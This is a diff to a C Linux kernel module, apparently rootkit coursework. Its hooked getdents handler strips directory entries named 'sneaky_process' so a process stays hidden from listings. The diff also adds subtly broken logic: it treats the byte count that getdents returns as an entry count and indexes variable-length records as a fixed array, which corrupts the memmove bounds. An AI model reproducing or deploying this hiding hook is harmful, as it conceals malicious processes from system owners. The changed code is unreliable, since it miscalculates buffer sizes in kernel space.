@@ -74,9 +74,9 @@ asmlinkage int sneaky_getdents (unsigned int fd,
 				struct linux_dirent *dirp,
 				unsigned int count) {
   // first call original getdents() to get all dirent structs
-  int dirent_size = sys_getdents(fd, dirp, count);
-  int examined_size = 0;
-  int skipped_size = 0;
+  int dirent_num = sys_getdents(fd, dirp, count);
+  int examined_num = 0;
+  int skipped_num = 0;
 
   printk("Get Dents!");
 
@@ -84,7 +84,7 @@ asmlinkage int sneaky_getdents (unsigned int fd,
   // skip: any dirent with filename == "sneaky_process"
   // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent
   int i; // ??? "forbids var declaration in for loop"??
-  for (i = 0; i < (dirent_size - skipped_size);) {
+  for (i = 0; i < (dirent_num - skipped_num);) {
     if (strcmp(dirp[i].d_name, "sneaky_process") == 0) {
       // ha! ISO C90 forbids mixed var declare & code !??
       void* unexamined_start;
@@ -92,10 +92,11 @@ asmlinkage int sneaky_getdents (unsigned int fd,
 
       printk("WWWWW Found!");
       
-      skipped_size += (int)(dirp[i].d_reclen);
+      skipped_num += 1;
 
       unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen;
-      unexamined_size = dirent_size - examined_size - skipped_size;
+      unexamined_size = dirp[dirent_num - skipped_num].d_reclen +
+	(int)((void*)(&dirp[dirent_num - skipped_num]) - unexamined_start);
 
       memmove((void*)(&dirp[i]),
 	      unexamined_start,
@@ -103,10 +104,10 @@ asmlinkage int sneaky_getdents (unsigned int fd,
       // i stays the same here, do not update!
       
     } else {
-      examined_size += (int)(dirp[i].d_reclen);
+      examined_num += 1;
       
       // update i here
-      i +=  (int)(dirp[i].d_reclen);
+      i++;
     }
   }
   
